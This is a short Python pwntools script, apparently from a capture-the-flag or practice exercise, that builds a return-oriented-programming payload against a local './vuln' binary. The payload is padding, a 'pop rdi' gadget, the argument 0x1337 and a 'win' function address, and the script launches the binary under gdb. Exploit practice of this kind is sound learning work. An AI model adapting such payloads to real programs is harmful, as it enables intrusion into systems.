#!/usr/bin/python

from pwn import *

offset = 0x5569d488d000
trash = cyclic(104)
poprdi = p64(0x0000000000002013 + offset)
token = p64(0x1337)
win = p64(0x00001ed2 + offset)

payload = trash + poprdi + token + win + p64(0)
#print(payload)

p = process("./vuln")

pid = gdb.attach(p, gdbscript= '''
break &main
x/x &win_authed
''')

line = pid.recvline().decode()
print(line)

